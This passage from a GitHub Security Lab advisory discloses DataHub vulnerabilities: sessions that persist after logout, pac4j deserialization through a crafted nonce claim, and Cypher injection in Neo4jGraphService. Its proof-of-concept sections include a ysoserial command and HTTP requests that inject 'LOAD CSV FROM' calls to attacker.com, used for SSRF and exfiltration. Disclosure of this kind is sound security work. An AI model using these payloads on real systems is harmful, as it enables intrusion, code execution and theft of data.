We were not sure what this `clear()` method involved but we verified that, even after the session was cleared on a new sign-in, any previously emitted Session cookies were still considered valid.

Therefore, any authentication checks using the `[AuthUtils.hasValidSessionCookie()](https://github.com/datahub-project/datahub/blob/aa146db611e3a4ca3aa17bb740783f789d4444d3/datahub-frontend/app/auth/AuthUtils.java#L78)` method could be bypassed by using a cookie from a logged out session.

The primary use of `AuthUtils.hasValidSessionCookie()` is in the `Authenticator` class that is used by the `@Security.Authenticated(Authenticator.class)` annotation. This annotation is used to define those methods requiring authentication. For example, the frontend proxy’s `proxy()` method that we reviewed previously uses this annotation:
  
  
  @Security.Authenticated(Authenticator.class)
  public CompletableFuture<Result> proxy(String path) throws ExecutionException, InterruptedException {
  ...
  }
  

### Impact

This issue may allow any logged out session cookie to be accepted as valid and therefore lead to an authentication bypass.

## Deserialization of untrusted data (`GHSL-2022-086`)

Following the audit of the DataHub authentication system, we took a look at Single-Sign-On (SSO). When the DataHub frontend is configured to authenticate via SSO, it will leverage the `[pac4j](https://www.pac4j.org/)` library. This library is a Java security framework that supports multiple forms of authentication, such as OAuth (Facebook, Twitter, Google, etc.), SAML, CAS, OpenID Connect, etc.

We found that `pac4j` processes parameters in the `id_token` value in an unsafe manner. Specifically, if any of the `id_token` claims value start with the `{#sb64}` prefix, `pac4j` considers the value to be a serialized Java object and will deserialize it.

One of the ways to exploit this vulnerability is to use a malicious `nonce` claim, as according to OpenID specification it can contain an arbitrary value and it is included into the signed `id_token` payload.

The vulnerable `pac4j` method is `[org.pac4j.core.profile.InternalAttributeHandler#restore()](https://github.com/pac4j/pac4j/blob/5834aeb22ad3a4369dfa572be60d7b20f5784a8f/pac4j-core/src/main/java/org/pac4j/core/profile/InternalAttributeHandler.java#L95)`
  
  
  public Object restore(final Object value) {
  if (value != null && value instanceof String) {
  final String sValue = (String) value;
  if (sValue.startsWith(PREFIX)) {
  if (sValue.startsWith(PREFIX_BOOLEAN)) {
  return Boolean.parseBoolean(sValue.substring(PREFIX_BOOLEAN.length()));
  } else if () {
  ...
  } else if (sValue.startsWith(PREFIX_SB64)) {
  return serializationHelper.unserializeFromBase64(sValue.substring(PREFIX_SB64.length()));
  }
  }
  }
  return value;
  }
  

However, we could not find this method when we looked at the latest version of `pac4j`. DataHub was using an old version of pac4j (3.6.0) and that the `InternalAttributeHandler` was [removed in version 4.1](https://github.com/pac4j/pac4j/blob/be4958ed6be42439439e97ebbc19c14fda8be401/documentation/docs/release-notes.md?plain=1#L199). We could not find any CVEs for this issue so it was either silently fixed or luckily patched. No matter what, we reported the issue to `pac4j` and CVE-2023-25581 was assigned to notify users of this library about the necessity to upgrade to the latest version.

### Impact

This issue may lead to Remote Code Execution (RCE) in the worst case. Although a `RestrictedObjectInputStream` is in place, that puts some restriction on what classes that can be deserialized, it still allows a broad range of java packages and potentially exploitable with different gadget chains.

### Proof of concept

In order for DataHub to be vulnerable, the following conditions should be met:

  1. DataHub should be configured to auth via SSO. It’s been tested on Google, but technically it should work with other providers as well.
  2. An attacker needs to have at least a valid account on the SSO provider (for Google, public accounts are just fine). This account does not necessarily need to have access to DataHub.
  3. There should be a suitable deserialization gadget chain within the project. The ysoserial’s [ULRDNS](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java) gadget will be used in this PoC to confirm the fact that the object is deserialized. Other suitable gadget chains may exist and have a greater impact, such as remote code execution, local file read or information disclosure.

To reproduce the vulnerability:

  1. Configure DataHub frontend authentication with Google as described in the [documentation](https://datahubproject.io/docs/authentication/guides/sso/configure-oidc-react-google/).
  2. Navigate to the DataHub frontend authentication endpoint: `http://datahub-frontend:9002/authenticate` 
  3. You will be redirected to Google Auth. On the Google page, before submitting an email, add the following value to the current url: `&nonce={%23sb64}rO0ABXN...serizalized_object_in_base64...` and reload the page. For the PoC, use the `[URLDNS](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java)` gadget chain from ysoserial project (e.g. `java -jar ysoserial.jar URLDNS http://attacker.com/`).
  4. Provide a valid google email and password.
  5. When you are redirected to `http://datahub-frontend:9002/callback/oidc` the nonce value will be deserialized.

## Neo4J’s Cypher Injection (`GHSL-2022-087`)

DataHub uses Neo4j as graph db in the backend to serve graph queries. For this purpose it uses the `[Neo4JGraphService.runQuery()](https://github.com/datahub-project/datahub/blob/aa146db611e3a4ca3aa17bb740783f789d4444d3/metadata-io/src/main/java/com/linkedin/metadata/graph/neo4j/Neo4jGraphService.java#L326)` method. We looked for user-controlled data flowing into this method and found that the `<frontend>/api/v2/graphql`, `<frontend>/api/gms/relationships` and `<backend>/relationships` endpoints were passing untrusted data into the `runQuery` method with no sanitization and without being properly parameterized into the queries.

All the above mentioned entry points will eventually call the `[findRelatedEntities()](https://github.com/datahub-project/datahub/blob/aa146db611e3a4ca3aa17bb740783f789d4444d3/metadata-io/src/main/java/com/linkedin/metadata/graph/neo4j/Neo4jGraphService.java#L97)` method with two user-controlled parameters: `sourceTypes` and `sourceEntityFilter` .

The `sourceTypes` parameter will get concatenated into the `WHERE` clause within the `computeEntityTypeWhereClause()` method:
  
  
  private String computeEntityTypeWhereClause(@Nonnull final List<String> sourceTypes, @Nonnull final List<String> destinationTypes) {
  String whereClause = "";
  
  Boolean hasSourceTypes = sourceTypes != null && !sourceTypes.isEmpty();
  Boolean hasDestTypes = destinationTypes != null && !destinationTypes.isEmpty();
  if (hasSourceTypes && hasDestTypes) {
  
  
  
  whereClause = String.format(" WHERE %s AND %s", sourceTypes.stream().map(type -> "src:" + type).collect(Collectors.joining(" OR ")), destinationTypes.stream().map(type -> "dest:" + type).collect(Collectors.joining(" OR ")));
  } else if (hasSourceTypes) {
  
  
  whereClause = String.format(" WHERE %s", sourceTypes.stream().map(type -> "src:" + type).collect(Collectors.joining(" OR ")));
  } else if (hasDestTypes) {
  
  
  whereClause = String.format(" WHERE %s", destinationTypes.stream().map(type -> "dest:" + type).collect(Collectors.joining(" OR ")));
  }
  return whereClause;
  }
  

The `sourceEntityFilter` variable (containing the user-controlled `urn`) will get concatenated into the filter clause within the `criterionToString()` method:
  
  
  @Nonnull
  private static String criterionToString(@Nonnull CriterionArray criterionArray) {
  if (!criterionArray.stream().allMatch(criterion -> Condition.EQUAL.equals(criterion.getCondition()))) {
  throw new RuntimeException("Neo4j query filter only support EQUAL condition " + criterionArray);
  }
  
  final StringJoiner joiner = new StringJoiner(",", "{", "}");
  
  criterionArray.forEach(criterion -> joiner.add(toCriterionString(criterion.getField(), criterion.getValue())));
  
  return joiner.length() <= 2 ? "" : joiner.toString();
  }
  

### Impact

This vulnerability may be leveraged to read or even wipe out the entire Neo4j database, initiate HTTP requests to either reach internal hosts (SSRF) or to exfiltrate information from the database.

### Proof of concept

Note: for the injection to be exploitable, Neo4J database needs to contain some nodes and relationships. This should not be a problem for a DataHub instance in production, but if you just installed it for testing, make sure some data exists by creating a `test` user and assign it a role (eg: `Reader`).

SSRF payload (`LOAD CSV FROM`) to the frontend’s `/api/v2/graphql` endpoint using the `types` argument:
  
  
  POST /api/v2/graphql HTTP/1.1
  Host: datahub-frontend:9002
  Content-Length: 361
  Cookie: PLAY_SESSION=ed6b4b6ca1c2cea6066b36e4316ba1e121ff89fe-actor=urn%3Ali%3Acorpuser%3Adatahub&token=eyJhbGciOiJIUzI1NiJ9.eyJhY3RvclR5cGUiOiJVU0VSIiwiYWN0b3JJZCI6ImRhdGFodWIiLCJ0eXBlIjoiU0VTU0lPTiIsInZlcnNpb24iOiIxIiwianRpIjoiMzc2NjNkMGMtZmRiZC00MGRkLTljMTEtYzY0NTY4YzkzZTI5Iiwic3ViIjoiZGF0YWh1YiIsImV4cCI6MTY2Mzg0NDc1OCwiaXNzIjoiZGF0YWh1Yi1tZXRhZGF0YS1zZXJ2aWNlIn0.nqnNM9Jfq2Vnuz7Kz58Xzge6TjjPepATZVEDgYOJrvI; actor=urn:li:corpuser:datahub
  Connection: close
  
  {
  "operationName": "getUser",
  "variables": {},
  "query": "query getUser {corpUser(urn: \"urn:li:corpuser:test\") {groups: relationships(input:{types:\"IsMemberOfRole]->(dest ) WHERE 1=1 WITH 1337 AS X LOAD CSV FROM 'http://attacker.com' AS y RETURN ''//\", direction: OUTGOING, start: 0, count:  20}) { count } }}"
  }
  

Note: the frontend is not vulnerable to the `urn` parameter because it parses it with `[createFromString](https://github.com/datahub-project/datahub/blob/aa146db611e3a4ca3aa17bb740783f789d4444d3/li-utils/src/main/javaPegasus/com/linkedin/common/urn/Urn.java#L230)` which will enforce that all parentheses are balanced.

SSRF payload (`LOAD CSV FROM`) to the backend’s `/relationships` endpoint using the `urn` parameter:
  
  
  GET /relationships?direction=INCOMING&types=OwnedBy&urn=urn%3Ali%3Acorpuser%3Atest%22%7D%29%20WHERE%201%3D1%20WITH%201337%20AS%20x%20LOAD%20CSV%20FROM%20%27https%3A%2F%2Fattacker.com%27%20AS%20y%20RETURN%20%27%27%2F%2F HTTP/1.1
  Host: datahub-backend:8080
  Authorization:Bearer ***REDACTED***
  Connection: close
  

SSRF payload (`LOAD CSV FROM`) to the backend’s `/relationships` endpoint using the `types` parameter:
  
  
  GET /relationships?direction=OUTGOING&types=IsMemberOfRole%5D-%3E%28dest%29%20WHERE%201%3D1%20WITH%201337%20AS%20x%20LOAD%20CSV%20FROM%20%27https%3A%2F%2Fattacker.com%27%20AS%20y%20RETURN%20%27%27%2F%2F&urn=urn:li:corpuser:test HTTP/1.1
  Host: datahub-backend:8080
  Authorization:Bearer ***REDACTED***
  Connection: close
  

## Credits

This assessment was conducted by the GitHub Security Lab as a team effort. The following are the finders of the reported issues:

  * SSRF/XSS (`GHSL-2022-076`) was found by Michael Stepankin (@artsploit) 
  * Open Redirect (`GHSL-2022-077`) was found by Alvaro Muñoz (@pwntester)
  * Missing JWT signature check (`GHSL-2022-078`) was found by Peter Stöckli (@p-)
  * System account impersonation (`GHSL-2022-079`) was found by Alvaro Muñoz (@pwntester)
  * JSON Injection (`GHSL-2022-080`) was found by Alvaro Muñoz (@pwntester), Kevin Stubbings (@Kwstubbs) and Jorge Rosillo (@jorgectf)
  * Login fails open on JAAS misconfiguration (`GHSL-2022-081`) was found by Peter Stöckli (@p-)
  * AES used in ECB mode (`GHSL-2022-082`) was found by Peter Stöckli (@p-)
  * Failure to Invalidate Session on Logout (`GHSL-2022-083`) was found by Alvaro Muñoz (@pwntester)
  * Deserialization of untrusted data (`GHSL-2022-086`) was found by Michael Stepankin (@artsploit) 
  * Multiple Cypher injections in Neo4JGraphService (`GHSL-2022-087`) was found by Kevin Stubbings (@Kwstubbs) and Sylwia Budzynska (@sylwia-budzynska)

## Timeline

  1. 2022-09-21: Issues were reported to the DataHub team.
  2. 2022-10-07: We notified the maintainers about fixes being published as part of the v0.8.45 release and asked them to request CVEs and prepare advisories for them.
  3. 2022-10-28: The advisory for `GHSL-2022-078` was published.
  4. 2023-01-06: The advisories for `GHSL-2022-076`, `GHSL-2022-079`, `GHSL-2022-080`, `GHSL-2022-081`, `GHSL-2022-083` and `GHSL-2022-086` were published.

## Summary

Using a mix of manual and CodeQL automated analysis, the GitHub Security Lab was able to uncover multiple critical vulnerabilities in DataHub. We disclosed these vulnerabilities directly through their Slack instance, which enabled an interactive and fluent communication between the teams that greatly helped getting the issues triaged and finally fixed. We would like to thank the DataHub team for promptly responding and fixing these vulnerabilities. As a result of this collaboration, DataHub has now improved the security of its code and, in turn, the security of hundreds of organizations using their software.

* * *

## Tags:

  * [ GitHub Security Lab ](https://github.blog/tag/github-security-lab/)

##  Written by 

![Alvaro Munoz](https://avatars.githubusercontent.com/u/125701?v=4&s=200)

###  [Alvaro Munoz](https://github.blog/author/pwntester/)

[@pwntester](https://github.com/pwntester)

  * [ GitHub Security Lab ](https://github.blog/tag/github-security-lab/)

## More on [GitHub Security Lab](https://github.blog/tag/github-security-lab/)

### [Hack the AI agent: Build agentic AI security skills with the GitHub Secure Code Game](https://github.blog/security/hack-the-ai-agent-build-agentic-ai-security-skills-with-the-github-secure-code-game/)

Learn to find and exploit real-world agentic AI vulnerabilities through five progressive challenges in this free, open source game that over 10,000 developers have already used to sharpen their security skills.

[Joseph Katsioloudes](https://github.blog/author/jkcso/ "Posts by Joseph Katsioloudes")

### [Securing the open source supply chain across GitHub](https://github.blog/security/supply-chain-security/securing-the-open-source-supply-chain-across-github/)

Recent attacks on open source focus on exfiltrating secrets; here are the prevention steps you can take today, plus a look at the security capabilities GitHub is working on.

[Zachary Steindler](https://github.blog/author/steiza/ "Posts by Zachary Steindler")

##  Related posts 

![A shield with a checkmark icon appears centered among decorative green blocks.](https://github.blog/wp-content/uploads/2026/01/github-generic-security-blocks-logo.png?resize=400%2C212)

[AI & ML](https://github.blog/ai-and-ml/)

###  [ Making secret scanning more trustworthy: Reducing false positives at scale ](https://github.blog/security/making-secret-scanning-more-trustworthy-reducing-false-positives-at-scale/)

Alerts are more trustworthy and actionable when noise is reduced. See how we improved the verification step with context-aware LLM reasoning.

[Mariko Wakabayashi](https://github.blog/author/mwakaba2/ "Posts by Mariko Wakabayashi")

![A grid of abstract cubes highlights a central cube displaying a shield with a checkmark to represent security.](https://github.blog/wp-content/uploads/2026/01/generic-security-logo-blocks-github.png?resize=400%2C212)

[Security](https://github.blog/security/)

###  [ Investigation update: GitHub Enterprise Server signing key rotation ](https://github.blog/security/investigating-unauthorized-access-to-githubs-internal-repositories/)

GitHub Enterprise Server customers need to take immediate action.

[Alexis Wales](https://github.blog/author/alexiswales/ "Posts by Alexis Wales")

![](https://github.blog/wp-content/uploads/2021/06/GitHub-Bug-Bounty.png?resize=400%2C212)

[Security](https://github.blog/security/)

###  [ Raising the bar: Quality, shared responsibility, and the future of GitHub’s bug bounty program ](https://github.blog/security/raising-the-bar-quality-shared-responsibility-and-the-future-of-githubs-bug-bounty-program/)

We’re updating our bug bounty program standards to prioritize quality submissions, clarify shared responsibility boundaries, and evolve how we reward low-risk findings.

[Jarom Brown](https://github.blog/author/jarombrown/ "Posts by Jarom Brown")

##  Explore more from GitHub 

![Docs](https://github.blog/wp-content/uploads/2024/07/Icon-Circle.svg)

###  Docs 

Everything you need to master GitHub, all in one place.

[ Go to Docs ](https://docs.github.com/)

![The ReadME Project](https://github.blog/wp-content/uploads/2022/05/readme.svg)

###  The ReadME Project 

Stories and voices from the developer community.

[ Learn more ](https://github.com/readme)

![GitHub Actions](https://github.blog/wp-content/uploads/2022/05/actions.svg)

###  GitHub Actions 

Native CI/CD alongside code hosted in GitHub.

[ Learn more ](https://github.com/features/actions)

![Enterprise content](https://github.blog/wp-content/uploads/2022/05/careers.svg)

###  Enterprise content 

Executive insights, curated just for you

[ Get started ](https://github.com/solutions/executive-insights)

## We do newsletters, too

Discover tips, technical guides, and best practices in our biweekly newsletter just for devs.

Your email address

* Your email address

Subscribe

Yes please, I’d like GitHub and affiliates to use my information for personalized communications, targeted advertising and campaign effectiveness. See the [GitHub Privacy Statement](https://github.com/site/privacy) for more details. 

Subscribe
